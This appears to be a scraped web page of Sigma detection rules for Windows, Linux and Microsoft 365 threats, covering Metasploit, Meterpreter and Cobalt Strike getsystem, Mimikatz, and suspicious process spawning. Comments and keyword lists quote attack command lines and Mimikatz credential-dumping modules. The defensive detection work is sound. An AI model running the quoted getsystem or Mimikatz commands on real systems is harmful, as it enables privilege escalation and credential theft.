<li><a href="#">title:Metasploit SMB Authentication description: Alerts on Metasploit host's authentications on the domain. status: experimental id: 72124974-a68b-4366-b990-d30e0b2a190d author: Chakib Gzenayi (@Chak092), Hosni Mribah date: 2020/05/06 modified: 2021/07/07 references: - tags: - attack.lateral_movement - attack.t1021.002 logsource: product: windows service: security detection: selection1: EventID: - 4625 - 4624 LogonType: 3 AuthenticationPackageName: 'NTLM' WorkstationName|re: '^[A-Za-z0-9]{16}$' selection2: ProcessName: EventID: 4776 Workstation|re: '^[A-Za-z0-9]{16}$' condition: selection1 or selection2 falsepositives: - Linux hostnames composed of 16 characters. level: high 
<li><a href="#">title:Meterpreter or Cobalt Strike Getsystem Service Installation id: 843544a7-56e0-4dcc-a44f-5cc266dd97d6 description: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation status: experimental author: Teymur Kheirkhabarov, Ecco, Florian Roth date: 2019/10/26 modified: 2022/02/01 references: - - tags: - attack.privilege_escalation - attack.t1134.001 - attack.t1134.002 logsource: product: windows service: system detection: selection_id: Provider_Name: 'Service Control Manager' EventID: 7045 selection: # meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\.\pipe\5e120a - ImagePath|contains|all: - 'cmd' - '/c' - 'echo' - '\pipe\' # cobaltstrike getsystem technique 1: %COMSPEC% /c echo 559891bb017 > \\.\pipe\5e120a - ImagePath|contains|all: - '%COMSPEC%' - '/c' - 'echo' - '\pipe\' # cobaltstrike getsystem technique 1b (expanded %COMSPEC%): %COMSPEC% /c echo 559891bb017 > \\.\pipe\5e120a - ImagePath|contains|all: - 'cmd.exe' - '/c' - 'echo' - '\pipe\' # meterpreter getsystem technique 2: rundll32.exe C:\Users\test\AppData\Local\Temp\tmexsn.dll,a /p:tmexsn - ImagePath|contains|all: - 'rundll32' - '.dll,a' - '/p:' - ImagePath|startswith: '\\\\127.0.0.1\\ADMIN$\' # condition: selection_id and selection fields: - ComputerName - SubjectDomainName - SubjectUserName - ImagePath falsepositives: - Highly unlikely level: critical 
<li><a href="#">title:Meterpreter or Cobalt Strike Getsystem Service Installation id: d585ab5a-6a69-49a8-96e8-4a726a54de46 related: - id: 843544a7-56e0-4dcc-a44f-5cc266dd97d6 type: derived description: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation status: experimental author: Teymur Kheirkhabarov, Ecco, Florian Roth date: 2019/10/26 modified: 2021/09/21 references: - - tags: - attack.privilege_escalation - attack.t1134.001 - attack.t1134.002 logsource: product: windows category: driver_load detection: selection: # meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\.\pipe\5e120a - ImagePath|contains|all: - 'cmd' - '/c' - 'echo' - '\pipe\' # cobaltstrike getsystem technique 1: %COMSPEC% /c echo 559891bb017 > \\.\pipe\5e120a - ImagePath|contains|all: - '%COMSPEC%' - '/c' - 'echo' - '\pipe\' # cobaltstrike getsystem technique 1b (expanded %COMSPEC%): %COMSPEC% /c echo 559891bb017 > \\.\pipe\5e120a - ImagePath|contains|all: - 'cmd.exe' - '/c' - 'echo' - '\pipe\' # meterpreter getsystem technique 2: rundll32.exe C:\Users\test\AppData\Local\Temp\tmexsn.dll,a /p:tmexsn - ImagePath|contains|all: - 'rundll32' - '.dll,a' - '/p:' condition: selection fields: - ComputerName - SubjectDomainName - SubjectUserName - ImagePath falsepositives: - Highly unlikely level: critical 
<li><a href="#">title:Meterpreter or Cobalt Strike Getsystem Service Installation id: ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34 related: - id: 843544a7-56e0-4dcc-a44f-5cc266dd97d6 type: derived description: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation status: experimental author: Teymur Kheirkhabarov, Ecco, Florian Roth date: 2019/10/26 modified: 2021/09/21 references: - - tags: - attack.privilege_escalation - attack.t1134.001 - attack.t1134.002 logsource: product: windows service: security detection: selection_id: EventID: 4697 selection: # meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\.\pipe\5e120a - ServiceFileName|contains|all: - 'cmd' - '/c' - 'echo' - '\pipe\' # cobaltstrike getsystem technique 1: %COMSPEC% /c echo 559891bb017 > \\.\pipe\5e120a - ServiceFileName|contains|all: - '%COMSPEC%' - '/c' - 'echo' - '\pipe\' # cobaltstrike getsystem technique 1b (expanded %COMSPEC%): %COMSPEC% /c echo 559891bb017 > \\.\pipe\5e120a - ServiceFileName|contains|all: - 'cmd.exe' - '/c' - 'echo' - '\pipe\' # meterpreter getsystem technique 2: rundll32.exe C:\Users\test\AppData\Local\Temp\tmexsn.dll,a /p:tmexsn - ServiceFileName|contains|all: - 'rundll32' - '.dll,a' - '/p:' condition: selection_id and selection fields: - ComputerName - SubjectDomainName - SubjectUserName - ServiceFileName falsepositives: - Highly unlikely level: critical 
<li><a href="#">title:Meterpreter or Cobalt Strike Getsystem Service Start id: 15619216-e993-4721-b590-4c520615a67d description: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting status: experimental author: Teymur Kheirkhabarov, Ecco, Florian Roth date: 2019/10/26 modified: 2021/05/20 references: - - tags: - attack.privilege_escalation - attack.t1134.001 - attack.t1134.002 logsource: category: process_creation product: windows detection: selection_1: ParentImage|endswith: '\services.exe' selection_2: # meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\.\pipe\5e120a - CommandLine|contains|all: - 'cmd' - '/c' - 'echo' - '\pipe\' # cobaltstrike getsystem technique 1: %COMSPEC% /c echo 559891bb017 > \\.\pipe\5e120a - CommandLine|contains|all: - '%COMSPEC%' - '/c' - 'echo' - '\pipe\' # cobaltstrike getsystem technique 1b (expanded env var): %COMSPEC% /c echo 559891bb017 > \\.\pipe\5e120a - CommandLine|contains|all: - 'cmd.exe' - '/c' - 'echo' - '\pipe\' # meterpreter getsystem technique 2: rundll32.exe C:\Users\test\AppData\Local\Temp\tmexsn.dll,a /p:tmexsn - CommandLine|contains|all: - 'rundll32' - '.dll,a' - '/p:' filter1: CommandLine|contains: 'MpCmdRun' condition: selection_1 and selection_2 and not filter1 fields: - ComputerName - User - CommandLine falsepositives: - Commandlines containing components like cmd accidentally - Jobs and services started with cmd level: high 
<li><a href="#">title:Microsoft 365 - Impossible Travel Activity id: d7eab125-5f94-43df-8710-795b80fa1189 status: test description: Detects when a Microsoft Cloud App Security reported a risky sign-in attempt due to a login associated with an impossible travel. author: Austin Songer @austinsonger references: - - date: 2020/07/06 modified: 2021/11/27 logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Impossible travel activity' status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.initial_access - attack.t1078 
<li><a href="#">title:Microsoft 365 - Potential Ransomware Activity id: bd132164-884a-48f1-aa2d-c6d646b04c69 status: experimental description: Detects when a Microsoft Cloud App Security reported when a user uploads files to the cloud that might be infected with ransomware. author: austinsonger date: 2021/08/19 references: - - logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Potential ransomware activity' status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1486 
<li><a href="#">title:Microsoft 365 - Unusual Volume of File Deletion id: 78a34b67-3c39-4886-8fb4-61c46dc18ecd status: experimental description: Detects when a Microsoft Cloud App Security reported a user has deleted a unusual a large volume of files. author: austinsonger date: 2021/08/19 references: - - logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Unusual volume of file deletion' status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1485 
<li><a href="#">title:Microsoft 365 - User Restricted from Sending Email id: ff246f56-7f24-402a-baca-b86540e3925c status: experimental description: Detects when a Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email. author: austinsonger date: 2021/08/19 references: - - logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'User restricted from sending email' status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.initial_access - attack.t1199 
<li><a href="#">title:Microsoft Binary Github Communication id: 635dbb88-67b3-4b41-9ea5-a3af2dd88153 status: test description: Detects an executable in the Windows folder accessing github.com author: Michael Haag (idea), Florian Roth (rule) references: - - - date: 2017/08/24 modified: 2021/11/27 logsource: category: network_connection product: windows detection: selection: Initiated: 'true' DestinationHostname|endswith: - '.github.com' - '.githubusercontent.com' Image|startswith: 'C:\Windows\' condition: selection falsepositives: - Unknown - '@subTee in your network' level: high tags: - attack.lateral_movement - attack.t1105 - attack.exfiltration - attack.t1567.001 
<li><a href="#">title:Microsoft Binary Suspicious Communication Endpoint id: e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97 status: test description: Detects an executable in the Windows folder accessing suspicious domains author: Florian Roth references: - - date: 2018/08/30 modified: 2022/07/03 logsource: category: network_connection product: windows detection: selection: Initiated: 'true' DestinationHostname|endswith: - 'dl.dropboxusercontent.com' - '.pastebin.com' - '.githubusercontent.com' # includes both gists and github repositories - 'cdn.discordapp.com/attachments/' - 'mediafire.com' - 'mega.nz' - 'ddns.net' - '.paste.ee' - '.hastebin.com/raw/' - '.ghostbin.co/' - 'ufile.io' Image|startswith: 'C:\Windows\' condition: selection falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1105 
<li><a href="#">title:Microsoft Defender Tamper Protection Trigger id: 49e5bc24-8b86-49f1-b743-535f332c2856 description: Detects block of attempt to disable real time protection of Microsoft Defender by tamper protection date: 2021/07/05 author: Bhabesh Raj references: - status: stable tags: - attack.defense_evasion - attack.t1562.001 falsepositives: - Administrator actions level: high logsource: product: windows service: windefend detection: selection: EventID: 5013 Value|endswith: - '\Windows Defender\DisableAntiSpyware = 0x1()' - '\Real-Time Protection\DisableRealtimeMonitoring = (Current)' condition: selection 
<li><a href="#">title:Microsoft Malware Protection Engine Crash id: 6c82cf5c-090d-4d57-9188-533577631108 description: This rule detects a suspicious crash of the Microsoft Malware Protection Engine tags: - attack.defense_evasion - attack.t1211 - attack.t1562.001 status: experimental date: 2017/05/09 modified: 2021/10/13 references: - - author: Florian Roth logsource: product: windows service: application detection: selection1: Provider_Name: 'Application Error' EventID: 1000 selection2: Provider_Name: 'Windows Error Reporting' EventID: 1001 keywords: - 'MsMpEng.exe' - 'mpengine.dll' condition: 1 of selection* and all of keywords falsepositives: - MsMpEng.exe can crash when C:\ is full level: high 
<li><a href="#">title:Microsoft Office Add-In Loading id: 8e1cb247-6cf6-42fa-b440-3f27d57e9936 status: test description: Detects add-ins that load when Microsoft Word or Excel starts (.wll/.xll are simply .dll fit for Word or Excel). author: NVISO references: - Internal Research date: 2020/05/11 modified: 2021/11/27 logsource: category: file_event product: windows detection: selection_wlldropped: TargetFilename|contains: \Microsoft\Word\Startup\ TargetFilename|endswith: .wll selection_xlldropped: TargetFilename|contains: \Microsoft\Excel\Startup\ TargetFilename|endswith: .xll selection_generic: TargetFilename|contains: \Microsoft\Addins\ TargetFilename|endswith: - .xlam - .xla condition: 1 of selection* falsepositives: - Legitimate add-ins level: high tags: - attack.persistence - attack.t1137.006 
<li><a href="#">title:Microsoft Office Product Spawning Windows Shell id: 438025f9-5856-4663-83f7-52f878a70a50 status: test description: Detects a Windows command and scripting interpreter executable started from Microsoft Word, Excel, Powerpoint, Publisher and Visio author: Michael Haag, Florian Roth, Markus Neis, Elastic, FPT.EagleEye Team references: - - date: 2018/04/06 modified: 2022/02/23 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - '\WINWORD.EXE' - '\EXCEL.EXE' - '\POWERPNT.exe' - '\MSPUB.exe' - '\VISIO.exe' - '\MSACCESS.EXE' - '\EQNEDT32.EXE' Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\wscript.exe' - '\cscript.exe' - '\sh.exe' - '\bash.exe' - '\scrcons.exe' - '\schtasks.exe' - '\regsvr32.exe' - '\hh.exe' - '\wmic.exe' # - '\mshta.exe' - '\rundll32.exe' - '\msiexec.exe' - '\forfiles.exe' - '\scriptrunner.exe' - '\mftrace.exe' - '\AppVLP.exe' - '\svchost.exe' # - '\msbuild.exe' # condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1204.002 
<li><a href="#">title:Microsoft Outlook Product Spawning Windows Shell id: 208748f7-881d-47ac-a29c-07ea84bf691d status: test related: - id: 438025f9-5856-4663-83f7-52f878a70a50 type: derived description: Detects a Windows command and scripting interpreter executable started from Microsoft Outlook author: Michael Haag, Florian Roth, Markus Neis, Elastic, FPT.EagleEye Team references: - - date: 2022/02/28 modified: 2022/05/31 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\OUTLOOK.EXE' Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\wscript.exe' - '\cscript.exe' - '\sh.exe' - '\bash.exe' - '\scrcons.exe' - '\schtasks.exe' - '\regsvr32.exe' - '\hh.exe' - '\wmic.exe' # - '\mshta.exe' # - '\rundll32.exe' # see comment below - '\msiexec.exe' - '\forfiles.exe' - '\scriptrunner.exe' - '\mftrace.exe' - '\AppVLP.exe' - '\svchost.exe' # - '\msbuild.exe' # - '\msdt.exe' # CVE-2022-30190 # Several FPs with rundll32.exe - we started excluding specific use cases and # ended commenting out all rundll32.exe sub processes #filter_outlook_photoviewer: # # ParentImage|endswith: '\OUTLOOK.EXE' # Image|endswith: '\rundll32.exe' # CommandLine|contains: '\PhotoViewer.dll' #filter_outlook_printattachments: # # ParentImage|endswith: '\OUTLOOK.EXE' # Image|endswith: '\rundll32.exe' # CommandLine|contains|all: # - 'shell32.dll,Control_RunDLL' # - '\SYSTEM32\SPOOL\DRIVERS\' condition: selection # and not 1 of filter* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1204.002 
<li><a href="#">title:Microsoft Sync Center Suspicious Network Connections id: 9f2cc74d-78af-4eb2-bb64-9cd1d292b87b status: experimental level: medium description: Detects suspicious connections from Microsoft Sync Center to non-private IPs. references: - author: elhoim date: 2022/04/28 modified: 2022/06/02 logsource: product: windows category: network_connection detection: selection_mobsync: Image|endswith: '\mobsync.exe' filter: DestinationIp|startswith: - '10.' - '192.168.' - '172.16.' - '172.17.' - '172.18.' - '172.19.' - '172.20.' - '172.21.' - '172.22.' - '172.23.' - '172.24.' - '172.25.' - '172.26.' - '172.27.' - '172.28.' - '172.29.' - '172.30.' - '172.31.' DestinationIsIpv6: 'false' condition: selection_mobsync and not filter falsepositives: - Unknown tags: - attack.t1055 - attack.t1218 - attack.execution - attack.defense_evasion 
<li><a href="#">title:Microsoft Workflow Compiler id: 419dbf2b-8a9b-4bea-bf99-7544b050ec8d status: experimental description: Detects invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code. tags: - attack.defense_evasion - attack.execution - attack.t1127 - attack.t1218 author: Nik Seetharaman, frack113 date: 2019/01/16 modified: 2021/07/13 references: - - logsource: category: process_creation product: windows detection: selection: Image|endswith: '\Microsoft.Workflow.Compiler.exe' selection_t1218: OriginalFileName: 'Microsoft.Workflow.Compiler.exe' CommandLine|contains: '.xml' condition: selection or selection_t1218 fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate MWC use (unlikely in modern enterprise environments) level: high 
<li><a href="#">title:Mimikatz Command Line id: a642964e-bead-4bed-8910-1bb4d63e3b4d status: test description: Detection well-known mimikatz command line arguments author: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton references: - - date: 2019/10/22 modified: 2022/02/07 tags: - attack.credential_access - attack.t1003.001 - attack.t1003.002 - attack.t1003.004 - attack.t1003.005 - attack.t1003.006 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains: - DumpCreds - invoke-mimikatz module_names: CommandLine|contains: - rpc - token - crypto - dpapi - sekurlsa - kerberos - lsadump - privilege - process - vault mimikatz_separator: CommandLine|contains: '::' function_names: # To cover functions from modules that are not in module_names (likely too generic) CommandLine|contains: - 'aadcookie' #misc module - 'detours' #misc module - 'memssp' #misc module - 'mflt' #misc module - 'ncroutemon' #misc module - 'ngcsign' #misc module - 'printnightmare' #misc module - 'skeleton' #misc module - 'preshutdown' #service module - 'mstsc' #ts module - 'multirdp' #ts module filter_1: CommandLine|contains: 'function Convert-GuidToCompressedGuid' condition: ( selection_1 or (module_names and mimikatz_separator) or (function_names and mimikatz_separator) ) and not 1 of filter* falsepositives: - Legitimate Administrator using tool for password recovery level: medium 
<li><a href="#">title:Mimikatz DC Sync id: 611eab06-a145-4dfa-a295-3ccc5c20f59a description: Detects Mimikatz DC sync security events status: experimental date: 2018/06/03 modified: 2022/04/26 author: Benjamin Delpy, Florian Roth, Scott Dermott, Sorina Ionescu references: - - - - tags: - attack.credential_access - attack.s0002 - attack.t1003.006 logsource: product: windows service: security detection: selection: EventID: 4662 Properties|contains: - 'Replicating Directory Changes All' - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' - '9923a32a-3607-11d2-b9be-0000f87a36b2' - '89e95b76-444d-4c62-991a-0facbeda640c' AccessMask: '0x100' filter1: SubjectDomainName: 'Window Manager' filter2: SubjectUserName|startswith: - 'NT AUT' - 'MSOL_' filter3: SubjectUserName|endswith: '$' condition: selection and not 1 of filter* falsepositives: - Valid DC Sync that is not covered by the filters; please report - Local Domain Admin account used for Azure AD Connect level: high 
<li><a href="#">title:Mimikatz In-Memory id: c0478ead-5336-46c2-bd5e-b4c84bc3a36e status: test description: Detects certain DLL loads when Mimikatz gets executed author: sigma references: - date: 2017/03/13 modified: 2021/11/27 logsource: category: image_load product: windows detection: selector: Image: 'C:\Windows\System32\rundll32.exe' dllload1: ImageLoaded|endswith: '\vaultcli.dll' dllload2: ImageLoaded|endswith: '\wlanapi.dll' exclusion: ImageLoaded: - 'ntdsapi.dll' - 'netapi32.dll' - 'imm32.dll' - 'samlib.dll' - 'combase.dll' - 'srvcli.dll' - 'shcore.dll' - 'ntasn1.dll' - 'cryptdll.dll' - 'logoncli.dll' timeframe: 30s condition: selector or dllload1 and dllload2 and not exclusion falsepositives: - Unknown level: medium tags: - attack.s0002 - attack.t1003 - attack.lateral_movement - attack.credential_access - car.2019-04-004 
<li><a href="#">title:Mimikatz Kirbi File Creation id: 9e099d99-44c2-42b6-a6d8-54c3545cab29 status: test description: Detects the creation of files that contain Kerberos tickets based on an extension used by the popular tool Mimikatz author: Florian Roth references: - date: 2021/11/08 tags: - attack.credential_access - attack.t1558 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: '.kirbi' condition: selection falsepositives: - Unlikely level: critical 
<li><a href="#">title:Mimikatz MemSSP Default Log File Creation id: 034affe8-6170-11ec-844f-0f78aa0c4d66 status: experimental description: Detects Mimikatz MemSSP default log file creation author: David ANDRE references: - date: 2021/12/20 tags: - attack.credential_access - attack.t1003 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: 'mimilsa.log' condition: selection falsepositives: - Unlikely level: critical 
<li><a href="#">title:Mimikatz through Windows Remote Management id: aa35a627-33fb-4d04-a165-d33b4afca3e8 description: Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe. references: - status: stable author: Patryk Prauze - ING Tech date: 2019/05/20 modified: 2021/06/21 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' SourceImage: 'C:\Windows\system32\wsmprovhost.exe' filter: GrantedAccess: '0x80000000' condition: selection and not filter tags: - attack.credential_access - attack.execution - attack.t1003.001 - attack.t1059.001 - attack.lateral_movement - attack.t1021.006 - attack.s0002 falsepositives: - Unlikely level: high 
<li><a href="#">title:Mimikatz Use id: 06d71506-7beb-4f22-8888-e2e5e2ca7fd8 description: This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups) status: experimental author: Florian Roth (rule), David ANDRE (additional keywords) date: 2017/01/10 modified: 2022/01/05 references: - tags: - attack.s0002 - attack.lateral_movement - attack.credential_access - car.2013-07-001 - car.2019-04-004 - attack.t1003.002 - attack.t1003.004 - attack.t1003.001 - attack.t1003.006 logsource: product: windows detection: keywords: - 'dpapi::masterkey' - 'eo.oe.kiwi' - 'event::clear' - 'event::drop' - 'gentilkiwi.com' - 'kerberos::golden' - 'kerberos::ptc' - 'kerberos::ptt' - 'kerberos::tgt' - 'Kiwi Legit Printer' - 'lsadump::' - 'mimidrv.sys' - '\mimilib.dll' - 'misc::printnightmare' - 'misc::shadowcopies' - 'misc::skeleton' - 'privilege::backup' - 'privilege::debug' - 'privilege::driver' - 'sekurlsa::' filter: EventID: 15 # Sysmon's FileStream Events (could cause false positives when Sigma rules get copied on/to a system) condition: keywords and not filter falsepositives: - Naughty administrators - AV Signature updates - Files with Mimikatz in their filename level: high 
<li><a href="#">title:MITRE BZAR Indicators for Execution id: b640c0b8-87f8-4daa-aef8-95a24261dd1d status: test description: 'Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE' author: '@neu5ron, SOC Prime' references: - date: 2020/03/19 modified: 2021/11/27 logsource: product: zeek service: dce_rpc detection: op1: endpoint: 'JobAdd' operation: 'atsvc' op2: endpoint: 'ITaskSchedulerService' operation: 'SchRpcEnableTask' op3: endpoint: 'ITaskSchedulerService' operation: 'SchRpcRegisterTask' op4: endpoint: 'ITaskSchedulerService' operation: 'SchRpcRun' op5: endpoint: 'IWbemServices' operation: 'ExecMethod' op6: endpoint: 'IWbemServices' operation: 'ExecMethodAsync' op7: endpoint: 'svcctl' operation: 'CreateServiceA' op8: endpoint: 'svcctl' operation: 'CreateServiceW' op9: endpoint: 'svcctl' operation: 'StartServiceA' op10: endpoint: 'svcctl' operation: 'StartServiceW' condition: 1 of op* falsepositives: - Windows administrator tasks or troubleshooting - Windows management scripts or software level: medium tags: - attack.execution - attack.t1047 - attack.t1053.002 - attack.t1569.002 
<li><a href="#">title:MITRE BZAR Indicators for Persistence id: 53389db6-ba46-48e3-a94c-e0f2cefe1583 status: test description: 'Windows DCE-RPC functions which indicate a persistence techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE.' author: '@neu5ron, SOC Prime' references: - date: 2020/03/19 modified: 2021/11/27 logsource: product: zeek service: dce_rpc detection: op1: endpoint: 'spoolss' operation: 'RpcAddMonitor' op2: endpoint: 'spoolss' operation: 'RpcAddPrintProcessor' op3: endpoint: 'IRemoteWinspool' operation: 'RpcAsyncAddMonitor' op4: endpoint: 'IRemoteWinspool' operation: 'RpcAsyncAddPrintProcessor' op5: endpoint: 'ISecLogon' operation: 'SeclCreateProcessWithLogonW' op6: endpoint: 'ISecLogon' operation: 'SeclCreateProcessWithLogonExW' condition: 1 of op* falsepositives: - Windows administrator tasks or troubleshooting - Windows management scripts or software level: medium tags: - attack.persistence - attack.t1547.004 
<li><a href="#">title:MMC Spawning Windows Shell id: 05a2ab7e-ce11-4b63-86db-ab32e763e11d status: test description: Detects a Windows command line executable started from MMC author: Karneades, Swisscom CSIRT references: - date: 2019/08/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\mmc.exe' selection2: - Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\wscript.exe' - '\cscript.exe' - '\sh.exe' - '\bash.exe' - '\reg.exe' - '\regsvr32.exe' - Image|contains: - '\BITSADMIN' condition: selection and selection2 fields: - CommandLine - Image - ParentCommandLine level: high tags: - attack.lateral_movement - attack.t1021.003 
<li><a href="#">title:MMC20 Lateral Movement id: f1f3bf22-deb2-418d-8cce-e1a45e46a5bd status: test description: Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of "-Embedding" as a child of svchost.exe author: '@2xxeformyshirt (Security Risk Advisors) - rule; Teymur Kheirkhabarov (idea)' references: - - date: 2020/03/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\svchost.exe' Image|endswith: '\mmc.exe' CommandLine|contains: '-Embedding' condition: selection falsepositives: - Unlikely level: high tags: - attack.execution - attack.t1021.003 
<li><a href="#">title:Modification of Boot Configuration id: 1444443e-6757-43e4-9ea4-c8fc705f79a2 status: stable description: Identifies use of the bcdedit command to delete boot configuration data. This tactic is sometimes used as by malware or an attacker as a destructive technique. author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - - date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \bcdedit.exe CommandLine|contains: set selection2: - CommandLine|contains|all: - bootstatuspolicy - ignoreallfailures - CommandLine|contains|all: - recoveryenabled - 'no' condition: selection1 and selection2 fields: - ComputerName - User - CommandLine falsepositives: - Unlikely level: high tags: - attack.impact - attack.t1490 
<li><a href="#">title:Modification Of Existing Services For Persistence id: 38879043-7e1e-47a9-8d46-6bec88e201df description: Detects modification of an existing service on a compromised host in order to execute an arbitrary payload when the service is started or killed as a method of persistence. references: - status: experimental tags: - attack.persistence - attack.t1543.003 - attack.t1574.011 author: Sreeman date: 2020/09/29 modified: 2022/03/06 logsource: category: process_creation product: windows detection: selection_cmdline_1: CommandLine|contains|all: - 'sc ' - 'config ' - 'binpath=' selection_cmdline_2: CommandLine|contains|all: - 'sc ' - 'failure' - 'command=' selection_cmdline_3: CommandLine|contains|all: - 'reg ' - 'add ' - 'FailureCommand' CommandLine|contains: - '.sh' - '.exe' - '.dll' - '.bin$' - '.bat' - '.cmd' - '.js' - '.msh$' - '.reg$' - '.scr' - '.ps' - '.vb' - '.jar' - '.pl' selection_cmdline_4: CommandLine|contains|all: - 'reg ' - 'add ' - 'ImagePath' CommandLine|contains: - '.sh' - '.exe' - '.dll' - '.bin$' - '.bat' - '.cmd' - '.js' - '.msh$' - '.reg$' - '.scr' - '.ps' - '.vb' - '.jar' - '.pl' condition: 1 of selection_cmdline_* falsepositives: - Unknown level: medium 
<li><a href="#">title:Modification of Explorer Hidden Keys id: 5a5152f1-463f-436b-b2f5-8eceb3964b42 description: Detects modifications to the hidden files keys in registry. This technique is abused by several malware families to hide their files from normal users. author: frack113 date: 2022/04/02 modified: 2022/06/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: EventType: Setvalue TargetObject: - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden Details: 'DWORD (0x00000000)' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1564.001 
<li><a href="#">title:Modification of IE Registry Settings id: d88d0ab2-e696-4d40-a2ed-9790064e66b3 description: Detects the modification of the registry settings used for Internet Explorer and other Windows components that use these settings author: frack113 date: 2022/01/22 modified: 2022/03/29 status: experimental references: - logsource: category: registry_set product: windows detection: selection_domains: EventType: SetValue TargetObject|contains: \Software\Microsoft\Windows\CurrentVersion\Internet Settings filter_dword: Details|startswith: DWORD filter_office: Details: - 'Cookie:' - 'Visited:' - '(Empty)' filter_path: TargetObject|contains: - '\Cache' - '\ZoneMap' - '\WpadDecision' filter_binary: Details: 'Binary Data' condition: selection_domains and not 1 of filter_* falsepositives: - Unknown level: low # as unknow false positives tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Modification of ld.so.preload id: 4b3cb710-5e83-4715-8c45-8b2b5b3e5751 status: test description: Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes. author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community references: - - date: 2019/10/24 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: 'PATH' name: '/etc/ld.so.preload' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1574.006 
<li><a href="#">title:Modified Rule in Windows Firewall with Advanced Security id: 5570c4d9-8fdd-4622-965b-403a5a101aa0 status: experimental description: A rule has been modified in the Windows Firewall exception list author: frack113 date: 2022/02/19 references: - (v=ws.10) logsource: product: windows service: firewall-as # EventID 49xx and 50xx are not used in the rule, please don't use Windows Server 2008 R2 detection: selection: EventID: 2005 filter: ModifyingApplication|startswith: - 'C:\Program Files (x86)\' - 'C:\Program Files\' condition: selection and not 1 of filter* level: low 
<li><a href="#">title:Modifies the Registry From a ADS id: 77946e79-97f1-45a2-84b4-f37b5c0d8682 status: experimental description: Detects the import of an alternate data stream with regini.exe, regini.exe can be used to modify registry keys. references: - - - tags: - attack.t1112 - attack.defense_evasion author: Eli Salem, Sander Wiebing, oscd.community date: 2020/10/12 modified: 2022/05/09 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\regini.exe' - OriginalFileName: 'REGINI.EXE' selection_re: CommandLine|re: ':[^ \\\\]' condition: selection and selection_re fields: - ParentImage - CommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Modifies the Registry From a File id: 5f60740a-f57b-4e76-82a1-15b6ff2cb134 status: experimental description: Detects the execution of regini.exe which can be used to modify registry keys, the changes are imported from one or more text files. references: - - - tags: - attack.t1112 - attack.defense_evasion author: Eli Salem, Sander Wiebing, oscd.community date: 2020/10/08 modified: 2022/05/09 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\regini.exe' - OriginalFileName: 'REGINI.EXE' filter: CommandLine|re: ':[^ \\\\]' # to avoid intersection with ADS rule condition: selection and not filter fields: - ParentImage - CommandLine falsepositives: - Legitimate modification of keys level: low 
<li><a href="#">title:Modifying Crontab id: af202fd3-7bff-4212-a25a-fb34606cfcbe status: experimental description: Detects suspicious modification of crontab file. # log example: Apr 16 11:18:18 localhost CROND[3333]: (user) REPLACE (user) author: Pawel Mazur references: - date: 2022/04/16 logsource: product: linux service: cron detection: keywords: - 'REPLACE' condition: keywords falsepositives: - Legitimate modification of crontab level: medium tags: - attack.persistence - attack.t1053.003 
